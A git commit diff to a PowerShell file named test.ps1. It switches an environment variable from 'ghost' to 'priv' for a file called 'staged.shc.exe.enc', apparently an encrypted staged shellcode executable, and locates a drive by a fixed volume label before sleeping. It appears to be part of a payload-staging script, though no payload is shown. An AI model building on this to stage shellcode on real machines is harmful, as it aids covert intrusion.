fb784879f91b6240cbab972a020b7fb722c6beed
RkDx <61869865+RkDx@users.noreply.github.com>
2022-09-21 19:02:08 +0200

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,4 +1,4 @@
-$Env:hagrid="ghost staged.shc.exe.enc";
+$Env:hagrid="priv staged.shc.exe.enc";
 $device = (((Get-WmiObject Win32_LogicalDisk) | select DeviceID, VolumeName) | where VolumeName -eq "CV-d065c789ca4aede" | foreach { $_.DeviceID });
 cd $device;
 sleep 20;
